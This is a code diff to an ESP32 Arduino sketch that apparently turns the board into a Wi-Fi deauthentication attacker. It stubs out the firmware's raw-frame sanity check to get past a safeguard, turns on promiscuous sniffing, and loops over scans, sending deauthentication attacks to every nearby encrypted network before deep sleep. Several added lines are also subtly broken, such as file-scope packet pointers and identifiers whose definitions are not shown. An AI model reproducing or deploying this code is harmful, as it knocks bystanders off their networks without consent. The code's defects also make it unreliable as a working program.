@@ -8,13 +8,18 @@
 // https://github.com/espressif/arduino-esp32/tree/master/libraries/WiFi/examples
 // Include Statements
 // -----------------------------------------
+// this bit is critically important to keep. Without it, nothing else will work.
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+    return 0;
+}
+// ---------------------------------------------------------------------------------------
 #include "WiFi.h"
 #include <esp_wifi.h>
 #include <esp_pm.h>
-#include <esp_wifi_netif.h>
+// #include <esp_wifi_netif.h>
 #include <esp_wifi_types.h>
-#include <esp_wifi_types_generic.h>
-#include <esp_wifi_ap_get_sta_list.h>
+// #include <esp_wifi_types_generic.h>
+// #include <esp_wifi_ap_get_sta_list.h>
 #include "wifi_tx.cpp"
 #include "types.h"
 #include <MacAddress.h>
@@ -32,10 +37,11 @@ MacRandomizer macRandom;
 // Deauth Constants
 // -----------------------------------------
 // const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t*)cbuf;
-// const wifi_packet_t *packet = (wifi_packet_t*)raw_packet->payload;
-// const mac_hdr_t *mac_header = &packet->hdr;
+const wifi_packet_t *raw_packet = (wifi_promiscuous_pkt_t*)cbuf;
+const wifi_packet_t *packet = (wifi_packet_t*)raw_packet->payload;
+const mac_hdr_t *mac_header = &packet->hdr;
 
-// const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
+const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
 
 const uint8_t SCAN_ROUNDS = 5;
 
@@ -143,12 +149,18 @@ esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, b
 //  WiFi.mode(WIFI_OFF);
 //}
 
+typedef enum {
+  WIFI_PKT_MGMT,  /**< Management frame, indicates 'buf' argument is wifi_promiscuous_pkt_t */
+  WIFI_PKT_CTRL,  /**< Control frame, indicates 'buf' argument is wifi_promiscuous_pkt_t */
+  WIFI_PKT_DATA,  /**< Data frame, indiciates 'buf' argument is wifi_promiscuous_pkt_t */
+  WIFI_PKT_MISC  /**< Other type, such as MIMO etc. 'buf' argument is wifi_promiscuous_pkt_t but the payload is zero length. */
+} wifi_promiscuous_pkt_type_t;
+
 // ----------------------------------------------------------------------------------------------
 // Sniffer Function | wifi_promiscuous_cb_t |  wifi_promiscuous_pkt_type_t type
 // ----------------------------------------------------------------------------------------------
-IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_t type) {
-  wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t*)buf;
-  wifi_packet_t *packet = (wifi_packet_t*)raw_packet->payload;
+IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_packet_t *packet = (wifi_promiscuous_pkt_t*)raw_packet->payload;
   mac_hdr_t *mac_header = &packet->hdr;
   uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
 
@@ -207,10 +219,16 @@ void setup() {
   digitalWrite(LED_PIN, LOW);   // Turn off LED
   Serial.begin(115200);
 
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); 
+  esp_wifi_init(&cfg); 
+  esp_wifi_set_storage(WIFI_STORAGE_RAM); 
+
   // Initialize WiFi in STA(station) mode
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
 
+  // Before setting anything else, we must enable the wifi.
+  WiFi.begin();
   // Set configuration values
   wifi_country_t config = {
     .cc = "US",
@@ -222,10 +240,11 @@ void setup() {
 
   // Enable promiscuous mode
   esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_filter(&filt); 
+  esp_wifi_set_promiscuous_rx_cb(&sniffer); 
   // Preliminary set channel to 6
   esp_wifi_set_channel(WiFi.channel(6), WIFI_SECOND_CHAN_NONE);
-  // esp_wifi_set_protocol(ifx, WIFI_PROTOCOL_11B);
-  WiFi.begin();
+  esp_wifi_set_protocol(ifx, WIFI_PROTOCOL_11B);
   Serial.println("Scanning for networks...");
 }
 
@@ -234,40 +253,23 @@ void setup() {
 // ----------------------------------------------------------------------
 void loop() {
   char err = false;
-  int ii = 0;
-  size_t size_charray = sizeof(CH_ARRAY) / sizeof(CH_ARRAY[0]);
-  while (ii < SCAN_ROUNDS)
-  {
-    int i;
-    for (int i = 0; i < size_charray; i++)
-    {
-      int wifi_channel = CH_ARRAY[i];
-      esp_wifi_set_channel(i, WIFI_SECOND_CHAN_NONE);
-      Serial.printf("Set channel to %d.\n", i);
-      int n = WiFi.scanNetworks();
-      if (n >= 1)
+  for (int i = 0; i < SCAN_ROUNDS; i++){
+    int n = WiFi.scanNetworks();
+    if (n >= 1) {
+      for (int i = 0; i < n; i++)
       {
-        for (int i = 0; i < n; i++)
-        {
-          if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN)
-          {
-            start_deauth(i, DEAUTH_TYPE_ALL, 0x7d3);
-          };
+        if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN) {
+          start_deauth(i, DEAUTH_TYPE_ALL, 0x7d3);
         };
       };
-      delay(scan_delay);
-    }
-    ii++;
-  }
+    };
+    delay(scan_delay);
+  };
   // Sleep to conserve power
   Serial.println("Going to sleep now");
   esp_sleep_enable_timer_wakeup(TIME_TO_SLEEP * uS_TO_S_FACTOR);
-  Serial.println("Setup ESP32 to sleep for every " + String(TIME_TO_SLEEP) +
-  " Seconds");
+  Serial.println("Setup ESP32 to sleep for every " + String(TIME_TO_SLEEP) + " Seconds");
   Serial.flush();
   esp_deep_sleep_start();
   Serial.println("This will never be printed");
 }
-
-void setup();
-void loop();
